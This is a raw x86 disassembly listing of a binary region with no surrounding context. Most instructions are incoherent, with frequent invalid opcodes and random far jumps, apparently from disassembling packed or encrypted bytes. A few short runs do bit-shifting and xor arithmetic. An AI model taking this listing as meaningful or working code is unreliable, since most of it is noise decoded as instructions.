  406ce9:	fstp   TBYTE PTR [esi+0x7d174ee]
  406cef:	push   ebx
  406cf0:	sbb    al,BYTE PTR [eax-0x7a4bcee9]
  406cf6:	pop    eax
  406cf7:	pop    ebp
  406cf8:	les    esp,FWORD PTR [edi+eiz*1-0x22]
  406cfc:	jmp    0x57bb:0xe4f9a37f
  406d03:	sub    BYTE PTR [ecx+edx*2+0x5e],0xcf
  406d08:	fiadd  DWORD PTR [edx]
  406d0a:	adc    ch,bl
  406d0c:	mov    eax,0xd7a683be
  406d11:	xchg   ebp,eax
  406d12:	dec    ebp
  406d13:	push   eax
  406d14:	add    dh,dl
  406d16:	xchg   DWORD PTR [esi-0x7db285e9],esi
  406d1c:	mov    al,ds:0xcf7d8a1d
  406d21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d22:	stos   BYTE PTR es:[edi],al
  406d23:	inc    edx
  406d24:	adc    BYTE PTR [esi],bh
  406d26:	stc    
  406d27:	iret   
  406d28:	lock add bh,BYTE PTR [esi+0x24f5456b]
  406d2f:	fmul   QWORD PTR [ecx+0x20]
  406d32:	inc    esi
  406d33:	mov    edi,0x3a01cb7
  406d38:	iret   
  406d39:	pop    eax
  406d3a:	inc    DWORD PTR [esi-0x3f47d7e5]
  406d40:	out    0xc1,eax
  406d42:	loope  0x406d62
  406d44:	mov    ecx,DWORD PTR [ebp-0x14]
  406d47:	xor    edx,edx
  406d49:	or     eax,edx
  406d4b:	mov    cl,BYTE PTR [eax+ecx*1]
  406d4e:	mov    eax,DWORD PTR [ebp-0x34]
  406d51:	add    BYTE PTR [eax],cl
  406d53:	mov    eax,DWORD PTR [ebp-0x60]
  406d56:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d59:	shrd   eax,ecx,0x2
  406d5d:	shr    ecx,0x2
  406d60:	mov    ecx,DWORD PTR [ebp-0x60]
  406d63:	mov    edx,DWORD PTR [ebp-0x5c]
  406d66:	xor    eax,edi
  406d68:	xor    edx,edx
  406d6a:	or     eax,edx
  406d6c:	lea    eax,[ebp+eax*1-0x4]
  406d70:	mov    DWORD PTR [ebp-0x34],eax
  406d73:	mov    eax,DWORD PTR [ebp-0x60]
  406d76:	shl    ecx,0x1e
  406d79:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d7c:	shrd   eax,ecx,0x2
  406d80:	shr    ecx,0x2
  406d83:	mov    ecx,DWORD PTR [ebp-0x60]
  406d86:	mov    edx,DWORD PTR [ebp-0x5c]
  406d89:	xor    eax,edi
  406d8b:	xor    edx,edx
  406d8d:	or     eax,edx
  406d8f:	mov    edx,DWORD PTR [ebp+0x14]
  406d92:	shl    ecx,0x1e
  406d95:	mov    ecx,DWORD PTR [ebp-0x14]
  406d98:	mov    cl,BYTE PTR [eax+ecx*1]
  406d9b:	mov    eax,DWORD PTR [ebp-0x34]
  406d9e:	or     BYTE PTR [eax],cl
  406da0:	mov    eax,DWORD PTR [ebp+0x10]
  406da3:	jmp    0x407181
  406da8:	fcmovnb st,st(6)
  406daa:	int3   
  406dab:	xchg   edi,eax
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	jnp    0x406dc9
  406daf:	sbb    cl,BYTE PTR [edi+0x766a0603]
  406db5:	out    dx,eax
  406db6:	mov    ds:0x188b0abc,eax
  406dbb:	sbb    BYTE PTR [esi+0x48181812],bl
  406dc1:	xchg   BYTE PTR [eax-0x1f],cl
  406dc4:	mov    db3,ebx
  406dc7:	clc    
  406dc8:	cs xchg edx,eax
  406dca:	clc    
  406dcb:	push   ebx
  406dcc:	cld    
  406dcd:	mov    al,0x69
  406dcf:	add    BYTE PTR [eax+0x32],cl
  406dd2:	mov    eax,0x21742f60
  406dd7:	pop    ss
  406dd8:	jnp    0x406e50
  406dda:	pop    es
  406ddb:	je     0x406dc4
  406ddd:	inc    edi
  406dde:	adc    DWORD PTR [eax-0x10a63f0d],0xffffffd9
  406de5:	push   edi
  406de6:	mov    eax,0xdd725b47
  406deb:	aad    0x43
  406ded:	scas   eax,DWORD PTR es:[edi]
  406dee:	cmp    BYTE PTR [edi],0xb4
  406df1:	data16 into 
  406df3:	cmp    bh,BYTE PTR [ebx+0x39adbd89]
  406df9:	xchg   BYTE PTR [esi],al
  406dfb:	and    DWORD PTR [esi-0x3650ee40],eax
  406e01:	mov    WORD PTR [edx],ss
  406e03:	add    al,0xe5
  406e05:	pop    edi
  406e06:	jnp    0x406e7a
  406e08:	les    edx,FWORD PTR [edi-0x6b20d6de]
  406e0e:	aaa    
  406e0f:	cs mov edx,0x97ab5f38
  406e15:	jmp    0x1d8c:0xebfb593a
  406e1c:	dec    esp
  406e1d:	dec    ecx
  406e1e:	es daa 
  406e20:	repnz mov bh,0x69
  406e23:	in     al,dx
  406e24:	(bad)  
  406e25:	mov    ecx,0x641cce91
  406e2a:	push   ebp
  406e2b:	mov    edi,0x501f169f
  406e30:	mov    cl,0xf3
  406e32:	sub    al,0xa4
  406e34:	mov    dh,0x8c
  406e36:	clc    
  406e37:	mov    bl,0x6c
  406e39:	inc    ebp
  406e3a:	lea    eax,[edi]
  406e3c:	add    eax,0xfb51f581
  406e41:	lods   eax,DWORD PTR ds:[esi]
  406e42:	call   0x7015:0xdc7a700
  406e49:	fistp  WORD PTR [edi]
  406e4b:	add    cl,0xf8
  406e4e:	jb     0x406e95
  406e50:	sub    eax,0xfc79c550
  406e55:	push   ebx
  406e56:	shl    DWORD PTR [eax-0x59],0x9d
  406e5a:	xor    al,0xc5
  406e5c:	int    0x58
  406e5e:	pop    eax
  406e5f:	aaa    
  406e60:	mov    edi,DWORD PTR [ebp-0x3e348f5e]
  406e66:	or     eax,0x3e1982a
  406e6b:	sub    eax,0xd9171004
  406e70:	mov    ecx,0x10ec0cf7
  406e75:	mov    esp,0x35598b38
  406e7a:	daa    
  406e7b:	pop    edx
  406e7c:	jae    0x406ee8
  406e7e:	push   esp
  406e7f:	jae    0x406e5c
  406e81:	jnp    0x406ec1
  406e83:	push   ds
  406e84:	bound  edi,QWORD PTR [ebp-0x3d5813e3]
  406e8a:	pop    ss
  406e8b:	push   cs
  406e8c:	das    
  406e8d:	std    
  406e8e:	inc    edx
  406e8f:	out    0xc4,al
  406e91:	pop    edx
  406e92:	sub    ebp,DWORD PTR [eax]
  406e94:	call   0x9bb9fd3e
  406e99:	repnz or ecx,ecx
  406e9c:	push   edi
  406e9d:	sbb    BYTE PTR [edi+0x3d],cl
  406ea0:	int    0x74
  406ea2:	jl     0x406e60
  406ea4:	mov    ch,0x18
  406ea6:	(bad)  
  406ea7:	adc    cl,cl
  406ea9:	(bad)  
  406eaa:	and    eax,0x172be792
  406eaf:	jl     0x406f20
  406eb1:	and    BYTE PTR [ebp-0x5c813144],ch
  406eb7:	mov    ds:0x56458e3,al
  406ebc:	test   BYTE PTR [esi+0x5],al
  406ebf:	shl    DWORD PTR [esi-0x2bc99dac],1
  406ec5:	fcom   st(2)
  406ec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ec8:	outs   dx,BYTE PTR ds:[esi]
  406ec9:	ja     0x406f04
  406ecb:	popf   
  406ecc:	retf   
  406ecd:	dec    ecx
  406ece:	mul    BYTE PTR [ebx-0x2ccf9a13]
  406ed4:	push   ebx
  406ed5:	and    edi,DWORD PTR [ebp+0x1fa72e]
  406edb:	rsqrtps xmm3,XMMWORD PTR [ecx]
  406ede:	(bad)  
  406edf:	cmp    eax,0xc2a1dc9e
  406ee4:	outs   dx,DWORD PTR ds:[esi]
  406ee5:	ror    ecx,1
  406ee7:	jnp    0x406f3b
  406ee9:	pushf  
  406eea:	ins    BYTE PTR es:[edi],dx
  406eeb:	pop    es
  406eec:	(bad)  
  406eed:	mov    ecx,0x827d315e
  406ef2:	std    
  406ef3:	xor    eax,DWORD PTR [ebx+0x1f]
  406ef6:	jle    0x406f35
  406ef8:	jle    0x406f5d
  406efa:	outs   dx,DWORD PTR ds:[esi]
  406efb:	sbb    eax,edi
  406efd:	test   DWORD PTR [eax],ecx
  406eff:	dec    esi
  406f00:	aad    0xbf
  406f02:	mov    dh,0x0
  406f04:	mov    esp,0xe93be0df
  406f09:	mov    al,0x2
  406f0b:	call   0x40bd:0x256349c6
  406f12:	loopne 0x406f79
  406f14:	jne    0x406ee9
  406f16:	push   cs
  406f17:	inc    esi
  406f18:	cmp    al,0xbc
  406f1a:	jg     0x406ed9
  406f1c:	pushf  
  406f1d:	pusha  
  406f1e:	dec    edi
  406f1f:	push   0xffffff9f
  406f21:	ss aas 
  406f23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f24:	leave  
  406f25:	pop    ebx
  406f26:	fs xchg ecx,eax
  406f28:	dec    ebx
  406f29:	mov    ecx,0x5c886243
  406f2e:	inc    edi
  406f2f:	popf   
  406f30:	add    eax,0x5354d3c4
  406f35:	push   ebx
  406f36:	and    al,0x63
  406f38:	xor    ebx,DWORD PTR [eax+0x21]
  406f3b:	retf   0x7071
  406f3e:	test   al,0x21
  406f40:	scas   eax,DWORD PTR es:[edi]
  406f41:	and    DWORD PTR [esi+0x20],ebp
  406f44:	pop    ss
  406f45:	cwde   
  406f46:	imul   ecx,eax,0xffffffc6
  406f49:	out    0x9c,al
  406f4b:	pop    eax
  406f4c:	dec    ebx
  406f4d:	add    DWORD PTR [edx],edi
  406f4f:	aas    
  406f50:	xor    esi,DWORD PTR [ecx+0x5d1c2e7f]
  406f56:	out    0xfc,al
  406f58:	inc    eax
  406f59:	lods   eax,DWORD PTR ds:[esi]
  406f5a:	mov    es,WORD PTR [eax+eiz*2]
  406f5d:	inc    esi
  406f5e:	pushf  
  406f5f:	daa    
  406f60:	jae    0x406fb3
  406f62:	and    dl,dl
  406f64:	pusha  
  406f65:	xor    al,0xc2
  406f67:	and    DWORD PTR [edx-0x1c1f990],esp
  406f6d:	jle    0x406f28
  406f6f:	lods   al,BYTE PTR ds:[esi]
  406f70:	lock lahf 
  406f72:	and    bl,BYTE PTR [ebp+0x19]
  406f75:	and    al,0xed
  406f77:	jnp    0x406f34
  406f79:	push   edx
  406f7a:	sbb    al,0xc3
  406f7c:	out    dx,eax
  406f7d:	lea    ecx,[esi-0x6ce4e556]
  406f83:	fisubr WORD PTR [ecx-0x7]
  406f86:	int3   
  406f87:	dec    ebp
  406f88:	mov    esp,0x6408ce4
  406f8d:	jbe    0x406f47
  406f8f:	mov    esp,0xe88fcbc3
  406f94:	mov    al,0xd
  406f96:	fnstcw WORD PTR [esi+esi*4-0x69]
  406f9a:	js     0x406f69
  406f9c:	lahf   
  406f9d:	or     ah,BYTE PTR [ecx]
  406f9f:	bound  eax,QWORD PTR [esi]
  406fa1:	mov    esp,esi
  406fa3:	vmwrite esi,DWORD PTR [esp+ebx*4]
  406fa7:	(bad)  
  406fa8:	pop    ebp
  406fa9:	pop    es
  406faa:	cwde   
  406fab:	into   
  406fac:	ds push cs
  406fae:	mov    DWORD PTR [edx],ebx
  406fb0:	cmp    ah,BYTE PTR [ecx-0x1b734a5a]
  406fb6:	(bad)  
  406fb7:	mov    ah,0xfa
  406fb9:	jmp    0x406fc4
  406fbb:	call   0x9247:0xb54b6a6d
  406fc2:	out    0x74,al
  406fc4:	pop    ss
  406fc5:	ret    0xf969
  406fc8:	sub    DWORD PTR ds:0x8d04ad52,0xbf4141c6
  406fd2:	(bad)  
  406fd3:	popa   
  406fd4:	and    DWORD PTR [edi+edx*8-0x7b],edi
  406fd8:	imul   ebx,DWORD PTR [ecx],0x84b0fd2a
  406fde:	xor    bh,BYTE PTR [eax]
  406fe0:	xor    al,0xe2
  406fe2:	ror    DWORD PTR [esi+0x54],1
  406fe5:	es mov edi,0x58c5ebd7
  406feb:	and    bh,BYTE PTR [esi+ebp*2]
  406fee:	arpl   WORD PTR [esp+edx*8-0x7e5c0453],si
  406ff5:	sbb    BYTE PTR [ecx+0x2a],ah
  406ff8:	aas    
  406ff9:	lods   eax,DWORD PTR ds:[esi]
  406ffa:	adc    DWORD PTR [ebx],ecx
  406ffc:	mov    edi,es
  406ffe:	rol    DWORD PTR [ebp-0x607cb617],0xe1
  407005:	arpl   WORD PTR [ebp-0x747f0f8b],si
  40700b:	jnp    0x406f9d
  40700d:	inc    edi
  40700e:	cli    
  40700f:	push   esp
  407010:	cwde   
  407011:	lods   al,BYTE PTR ds:[esi]
  407012:	jb     0x406fee
  407014:	mov    al,ds:0xc2de94cc
  407019:	sub    al,0x9f
  40701b:	fimul  WORD PTR [edx+0x34]
  40701e:	jae    0x40706a
  407020:	addr16 push 0xf3d793ed
  407026:	pop    edi
  407027:	sub    eax,DWORD PTR [eax-0xa]
  40702a:	and    DWORD PTR [edi-0xb445257],eax
  407030:	mov    al,0x1e
  407032:	jo     0x40703d
  407034:	ins    DWORD PTR es:[edi],dx
  407035:	fwait
  407036:	mov    cl,0x61
  407038:	push   0x27
  40703a:	cmp    eax,0x40f755d6
  40703f:	add    cl,BYTE PTR [ecx+0x26a2c7e5]
  407045:	or     esi,DWORD PTR [eax]
  407047:	mov    DWORD PTR [ebp+0x6d9051b3],esp
  40704d:	mov    DWORD PTR [eax-0x65d9c6bd],edx
  407053:	dec    ecx
  407054:	xchg   ecx,eax
  407055:	fldenv [eax-0x11d20592]
  40705b:	mov    bl,0xcf
  40705d:	sbb    ebp,DWORD PTR [ecx]
  40705f:	sub    DWORD PTR [ecx-0x7970151d],esi
  407065:	sbb    esp,DWORD PTR [ecx-0x2]
  407068:	pop    es
  407069:	and    eax,0x52fa5eac
  40706e:	repnz xchg esp,eax
  407070:	mov    ebx,0xcbfe819
  407075:	sub    DWORD PTR [ebp+edi*1+0x69e698bf],esp
  40707c:	aam    0x6e
  40707e:	mov    ch,0x56
  407080:	and    esi,ebx
  407082:	shl    dh,cl
  407084:	push   ebx
  407085:	es hlt 
  407087:	int    0xf9
  407089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40708b:	clc    
  40708c:	push   ebx
  40708d:	add    BYTE PTR [esp+eax*8-0x2b],ch
  407091:	mov    WORD PTR [esi],?
  407093:	xchg   ecx,eax
  407094:	pop    ds
  407095:	pushf  
  407096:	pop    ebx
  407097:	dec    edx
  407098:	data16 fistp DWORD PTR [edx]
  40709b:	pop    ebp
  40709c:	mov    ah,0x5a
  40709e:	sti    
  40709f:	mov    WORD PTR [edx],es
  4070a1:	(bad)  
  4070a3:	ret    0x679b
  4070a6:	sub    eax,0xc83f85e
  4070ab:	in     eax,0xee
  4070ad:	and    al,0xc4
  4070af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070b0:	dec    edi
  4070b1:	out    0xe3,al
  4070b3:	ret    0xdeb2
  4070b6:	adc    DWORD PTR [edx+0x30],esp
  4070b9:	xchg   ecx,eax
  4070ba:	jecxz  0x407094
  4070bc:	mov    al,0x6a
  4070be:	test   BYTE PTR [edx+0x1022e665],bl
  4070c4:	jmp    0xaba9e22e
  4070c9:	inc    ebx
  4070ca:	jbe    0x40708e
  4070cc:	push   esp
  4070cd:	ins    BYTE PTR es:[edi],dx
  4070ce:	fadd   DWORD PTR [ecx+ecx*2+0x74]
  4070d2:	dec    ecx
  4070d3:	pop    esp
  4070d4:	hlt    
  4070d5:	mov    dh,0x83
  4070d7:	les    edx,FWORD PTR [edi+ecx*2]
  4070da:	jno    0x407116
  4070dc:	push   esp
  4070dd:	jg     0x407062
  4070df:	push   eax
  4070e0:	jo     0x4070ec
  4070e2:	add    DWORD PTR [ecx+ebx*1-0x6],edx
  4070e6:	call   0xa7d2:0x8a110cc3
  4070ed:	test   eax,0xa62e739d
  4070f2:	push   ss
  4070f3:	stos   BYTE PTR es:[edi],al
  4070f4:	or     al,0xe3
  4070f6:	(bad)  
  4070f7:	xor    ah,ah
  4070f9:	xchg   ebx,eax
  4070fa:	push   edx
  4070fb:	data16 jge 0x4070ce
  4070fe:	test   BYTE PTR [ecx+eiz*8],0x44
  407102:	mov    edi,0xa22e0ba5
  407107:	jns    0x40708d
  407109:	pop    es
  40710a:	ja     0x40715a
  40710c:	mov    ebx,0x4d4a47bb
  407111:	dec    esi
  407112:	dec    edx
  407113:	xor    BYTE PTR [edi+0x1d6c684f],bl
  407119:	(bad)  
  40711a:	xlat   BYTE PTR ds:[ebx]
  40711b:	inc    ecx
  40711c:	xor    esp,ebx
  40711e:	fcom   QWORD PTR [ebx+0x3b]
  407121:	outs   dx,DWORD PTR ds:[esi]
  407122:	ret    0x9ed3
  407125:	shl    ecx,1
  407127:	push   ecx
  407128:	mov    ebp,0x267a8f51
  40712d:	mov    ebx,0xf09d2841
  407132:	jbe    0x40719b
  407134:	rol    BYTE PTR [esi+0x57],0x6
  407138:	xchg   esp,eax
  407139:	mov    al,ds:0x320153b7
  40713e:	daa    
  40713f:	or     bh,ch
  407141:	cmp    bl,0x51
  407144:	(bad)  
  407145:	dec    esp
  407146:	ret    0xee53
  407149:	test   al,0xb3
  40714b:	stos   DWORD PTR es:[edi],eax
  40714c:	jg     0x4071c5
  40714e:	cmp    eax,DWORD PTR [ebx+0x2e]
  407151:	loop   0x40710d
  407153:	arpl   ax,ax
  407155:	jmp    DWORD PTR [edx+edi*2-0x4709a9bd]
  40715c:	jmp    0x56c9:0xde45540d
  407163:	addr16 popf 
  407165:	iret   
  407166:	inc    edx
  407167:	jecxz  0x4071ae
  407169:	mov    bh,0x30
  40716b:	fist   DWORD PTR [edx+0x16]
  40716e:	mov    BYTE PTR [eax+0x1f27595f],ch
  407174:	js     0x407153
  407176:	das    
  407177:	push   esp
  407178:	iret   
  407179:	shl    BYTE PTR [edi],1
  40717b:	aam    0x5d
  40717d:	jg     0x407192
  40717f:	hlt    
  407180:	dec    edx
  407181:	mov    ecx,eax
  407183:	shrd   ecx,edx,0x2
  407187:	shl    eax,0x1e
  40718a:	shr    edx,0x2
  40718d:	mov    DWORD PTR [ebp+0x14],edx
  407190:	mov    DWORD PTR [ebp+0x14],eax
  407193:	xor    edx,edx
  407195:	mov    eax,ecx
  407197:	xor    eax,edi
  407199:	or     eax,edx
  40719b:	mov    edx,DWORD PTR [ebp-0x4]
  40719e:	dec    eax
  40719f:	not    eax
  4071a1:	and    eax,edx
  4071a3:	xor    ecx,edi
  4071a5:	mov    DWORD PTR [ebp-0x4],eax
  4071a8:	mov    DWORD PTR [ebp+0x14],ecx
  4071ab:	xor    eax,eax
  4071ad:	or     DWORD PTR [ebp+0x14],eax
  4071b0:	mov    eax,DWORD PTR [ebp-0x50]
  4071b3:	jmp    0x407591
  4071b8:	fiadd  DWORD PTR [ecx-0x1d]
  4071bb:	mov    ah,BYTE PTR [edx]
  4071bd:	sub    bl,BYTE PTR [edx+0x21]
  4071c0:	jnp    0x407190
  4071c2:	mov    ch,0x7c
  4071c4:	sub    esp,DWORD PTR [ebp+0x6]
  4071c7:	push   0xffffff90
  4071c9:	test   DWORD PTR [eax],ebx
  4071cb:	sbb    BYTE PTR [esi+0x37181812],bl
  4071d1:	sub    dl,bl
  4071d3:	sub    BYTE PTR [ebx+0x4b],bh
  4071d6:	test   al,0x8f
  4071d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071d9:	and    DWORD PTR [esi+eiz*2-0x1bbd495e],0xffffffb7
  4071e1:	xchg   esp,eax
  4071e2:	dec    ebp
  4071e3:	or     ch,BYTE PTR [ebx]
  4071e5:	(bad)  
  4071e6:	loop   0x407250
  4071e8:	clc    
  4071e9:	(bad)  
  4071ea:	daa    
  4071eb:	adc    BYTE PTR [ecx+0x13],ch
  4071ee:	cmp    ah,al
  4071f0:	out    dx,al
  4071f1:	xchg   edi,eax
  4071f2:	mov    DWORD PTR [ebp-0x52ab547d],eax
  4071f8:	and    DWORD PTR [edx],ebx
  4071fa:	pop    eax
  4071fb:	mov    BYTE PTR [eax],ch
  4071fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071fe:	mov    ebx,edx
  407200:	add    al,0x36
  407202:	outs   dx,DWORD PTR ds:[esi]
  407203:	lea    edi,[esi]
  407205:	jmp    0x9883:0x946acc7f
  40720c:	aas    
  40720d:	or     BYTE PTR [ecx+0x4c374d79],al
  407213:	or     DWORD PTR [ebx+esi*8],ebx
  407216:	push   ss
  407217:	push   0xa2c2209e
  40721c:	enter  0x8b7e,0x40
  407220:	adc    eax,0xd9668700
  407225:	mov    cl,0xa7
  407227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407228:	std    
  407229:	out    dx,al
  40722a:	sub    al,0x1a
  40722c:	push   ebp
  40722d:	sbb    eax,0xced60576
  407232:	sub    DWORD PTR [esi],edx
  407234:	dec    ebx
  407235:	mov    ebp,ss
  407237:	adc    DWORD PTR [ebx],0x93dda321
  40723d:	dec    ebx
  40723e:	jmp    0xba24:0x1666e22c
  407245:	adc    DWORD PTR [esi+0x6f7ef13b],esp
  40724b:	enter  0x469a,0x7c
  40724f:	dec    ebx
  407250:	push   cs
  407251:	dec    edi
  407252:	retf   
  407253:	mov    ecx,0x76e6f00c
  407258:	pusha  
  407259:	jmp    0x2faf492e
  40725e:	ret    0xae0e
  407261:	fiadd  DWORD PTR [esi]
  407263:	out    0x20,al
  407265:	or     al,BYTE PTR [ebp-0x824cc3f]
  40726b:	sub    ecx,DWORD PTR [ebx+0xf13e64f]
  407271:	imul   ebx,eax,0x4ce19059
  407277:	xlat   BYTE PTR ds:[ebx]
  407278:	jl     0x4072b7
  40727a:	sbb    eax,0x6f5b97ae
  40727f:	push   edi
  407280:	das    
  407281:	pushf  
  407282:	loopne 0x4072b4
  407284:	mov    al,ds:0xbe21787f
  407289:	lock dec esi
  40728b:	mov    eax,ebp
  40728d:	add    eax,0x57e39ee1
  407292:	sbb    DWORD PTR [ebx+0x4eb36029],0xa
  407299:	sar    BYTE PTR [ecx+0x5c],0xa6
  40729d:	jmp    0x407260
  40729f:	jl     0x40728e
  4072a1:	pop    esi
  4072a2:	fadd   DWORD PTR [eax+0x44]
  4072a5:	adc    al,0x0
  4072a7:	and    eax,0xc2dbf204
  4072ac:	cmp    al,0xe3
  4072ae:	pop    edx
  4072af:	loopne 0x40730d
  4072b1:	in     al,dx
  4072b2:	dec    edx
  4072b3:	(bad)  [esi-0x2a]
  4072b6:	ds adc esi,edi
  4072b9:	pop    eax
  4072ba:	(bad)  
  4072bb:	gs pop ss
  4072bd:	dec    ebx
  4072be:	ja     0x407247
  4072c0:	loope  0x40725d
  4072c2:	lods   eax,DWORD PTR ds:[esi]
  4072c3:	or     al,0xc2
  4072c5:	mov    ds:0xe4c7ee53,al
  4072ca:	cld    
  4072cb:	test   eax,0xf7eaa12c
  4072d0:	xchg   ebx,eax
  4072d1:	in     al,dx
  4072d2:	sub    eax,0x73eba942
  4072d7:	push   esp
  4072d8:	fsub   DWORD PTR ds:0xbfe72a9e
  4072de:	dec    esp
  4072df:	test   DWORD PTR [edi-0x4f92501b],esp
  4072e5:	or     DWORD PTR [ecx+0x359b7017],0x20ae7214
  4072ef:	(bad)  
  4072f1:	pop    eax
  4072f2:	jmp    0x407291
  4072f4:	inc    esp
  4072f5:	jl     0x4072c9
  4072f7:	ds inc eax
  4072f9:	cmc    
  4072fa:	add    ecx,DWORD PTR [edx-0x2a]
  4072fd:	adc    esp,DWORD PTR [esi+0x5c]
  407300:	pop    eax
  407301:	out    dx,eax
  407302:	inc    edi
  407303:	push   cs
  407304:	jnp    0x40736e
  407306:	lds    edx,FWORD PTR [ecx]
  407308:	neg    BYTE PTR ds:0x490deaac
  40730e:	fs shl edi,cl
  407311:	xchg   esp,ebp
  407313:	test   bl,dl
  407315:	mov    bh,0x98
  407317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407318:	xchg   esp,eax
  407319:	arpl   WORD PTR ds:0xfe5205cb,si
  40731f:	xchg   ch,cl
  407321:	mov    bl,0x5d
  407323:	mov    BYTE PTR [edi+0x5913278f],bl
  407329:	sbb    al,0xeb
  40732b:	add    ebp,edi
  40732d:	fs mov bl,0x41
  407330:	int3   
  407331:	jmp    0xf82:0xd97e74e6
  407338:	sub    al,BYTE PTR [edi+0x61]
  40733b:	mov    ecx,0xc3a9bc1b
  407340:	ins    DWORD PTR es:[edi],dx
  407341:	mov    ss:0xd40d89a6,al
  407347:	cmp    eax,0xa3cd7cbb
  40734c:	xchg   DWORD PTR [esi+0x25404e15],esp
  407352:	sub    bl,ah
  407354:	push   cs
  407355:	fld    DWORD PTR [ebp+0x40]
  407358:	cld    
  407359:	arpl   WORD PTR [esi],dx
  40735b:	lea    eax,[edi]
  40735d:	jno    0x4073c2
  40735f:	pop    ds
  407360:	pop    edi
  407361:	fistp  WORD PTR [eax]
  407363:	adc    DWORD PTR [eax-0x28],ebp
  407366:	nop
  407367:	int3   
  407368:	fst    QWORD PTR [ecx+0x2d]
  40736b:	jbe    0x407389
  40736d:	fs xor eax,0x87196e90
  407373:	jo     0x4072f9
  407375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407376:	xor    dh,dh
  407378:	ins    BYTE PTR es:[edi],dx
  407379:	mov    cl,BYTE PTR [edi]
  40737b:	inc    esi
  40737c:	cmp    al,0x68
  40737e:	(bad)  
  40737f:	mov    dh,0xe9
  407381:	xchg   BYTE PTR [edx+0x106e1352],ch
  407387:	in     al,0x8d
  407389:	and    ah,bh
  40738b:	adc    BYTE PTR [esp+eax*1],ah
  40738e:	fst    DWORD PTR [edx]
  407390:	and    eax,DWORD PTR [ecx+edi*8]
  407393:	and    edi,DWORD PTR [ecx-0x2f]
  407396:	mov    esi,0xbce4df46
  40739b:	loope  0x40736d
  40739d:	dec    ebp
  40739e:	dec    ebp
  40739f:	icebp  
  4073a0:	ror    DWORD PTR [ecx],cl
  4073a2:	sub    ch,BYTE PTR [edx-0x119c5617]
  4073a8:	and    ah,dl
  4073aa:	je     0x40741a
  4073ac:	std    
  4073ad:	and    dl,ch
  4073af:	popf   
  4073b0:	inc    esp
  4073b1:	xlat   BYTE PTR gs:[ebx]
  4073b3:	jmp    0xc06a:0x41ed5757
  4073ba:	rcr    DWORD PTR [esi+esi*2],1
  4073bd:	ss dec edi
  4073bf:	pop    edx
  4073c0:	or     al,0x80
  4073c2:	aam    0x7c
  4073c4:	add    cl,al
  4073c6:	into   
  4073c7:	loope  0x407419
  4073c9:	repnz sbb dl,BYTE PTR [edi+esi*1]
  4073cd:	or     BYTE PTR [edi+ecx*8],0x28
  4073d1:	mov    al,0xae
  4073d3:	out    dx,al
  4073d4:	scas   al,BYTE PTR es:[edi]
  4073d5:	pop    edx
  4073d6:	pop    eax
  4073d7:	sub    esp,DWORD PTR [edi+0x9d1d807]
  4073dd:	jnp    0x40738f
  4073df:	xchg   esp,eax
  4073e0:	iret   
  4073e1:	rcl    DWORD PTR [edx+0x1d],cl
  4073e4:	jbe    0x40736b
  4073e6:	rol    BYTE PTR [ebp+0x63899b6f],cl
  4073ec:	sbb    BYTE PTR [ecx+0x6eadf917],dl
  4073f2:	fcmovnu st,st(0)
  4073f4:	aas    
  4073f5:	xor    eax,0xfa4fc983
  4073fa:	adc    eax,0x57952685
  4073ff:	push   ds
  407400:	xor    DWORD PTR [esi+0x7b53936a],esi
  407406:	es xchg esp,eax
  407408:	je     0x4073c9
  40740a:	neg    DWORD PTR [esi]
  40740c:	inc    ebp
  40740d:	xor    eax,0x8bc8c712
  407412:	mov    ecx,0x88e7ab2a
  407417:	shl    BYTE PTR ds:0x1ecc5daa,cl
  40741d:	xor    ebp,ebp
  40741f:	sub    esi,ebx
  407421:	int    0xc3
  407423:	sbb    DWORD PTR [eax+0x161767c7],0x9c7c9124
  40742d:	mov    bh,0xa
  40742f:	je     0x407439
  407431:	ret    
  407432:	jecxz  0x40743f
  407434:	std    
  407435:	xchg   edx,eax
  407436:	cwde   
  407437:	inc    esi
  407438:	stos   DWORD PTR es:[edi],eax
  407439:	enter  0x745a,0xe9
  40743d:	ins    BYTE PTR es:[edi],dx
  40743e:	lahf   
  40743f:	dec    ebp
  407440:	inc    eax
  407441:	inc    eax
  407442:	mov    edx,0x41c2cc28
  407447:	repnz outs dx,BYTE PTR ds:[esi]
  407449:	xchg   BYTE PTR [edi-0x1a],bl
  40744c:	rcr    DWORD PTR [edx],0x16
  40744f:	enter  0x86c4,0x1
  407453:	inc    edi
  407454:	mov    ebp,0x3fedf7ab
  407459:	inc    edi
  40745a:	push   edx
  40745b:	retf   
  40745c:	rcr    ebx,cl
  40745e:	(bad)  
  40745f:	sub    esi,DWORD PTR [edi-0x53]
  407462:	idiv   BYTE PTR [eax-0x3ca04603]
  407468:	push   cs
  407469:	pop    edi
  40746a:	ins    DWORD PTR es:[edi],dx
  40746b:	pop    esp
  40746c:	les    ebx,FWORD PTR [eax]
  40746e:	fbstp  TBYTE PTR [edx]
  407470:	hlt    
  407471:	test   eax,0xe4fe3e2d
  407476:	xchg   edi,eax
  407477:	(bad)  
  407478:	aam    0x1d
  40747a:	je     0x40743d
  40747c:	icebp  
  40747d:	sbb    ah,bh
  40747f:	test   DWORD PTR [eax-0x51],ebp
  407482:	sbb    al,0x2
  407484:	in     eax,dx
  407485:	fild   WORD PTR [esi+0x6e]
  407488:	and    al,0x3b
  40748a:	sahf   
  40748b:	sbb    bl,bh
  40748d:	push   eax
  40748e:	(bad)  
  40748f:	fdiv   DWORD PTR [ecx-0x2a]
  407492:	mov    ecx,0xb9ba278a
  407497:	push   0x72
  407499:	fsub   QWORD PTR [ecx]
  40749b:	or     DWORD PTR [bp+si-0x5d6e],edi
  4074a0:	sbb    cl,BYTE PTR [esi]
  4074a2:	mov    esp,0x13848310
  4074a7:	test   al,0x3e
  4074a9:	call   0x65626479
  4074ae:	ins    DWORD PTR es:[edi],dx
  4074af:	rol    DWORD PTR [eax-0x43],1
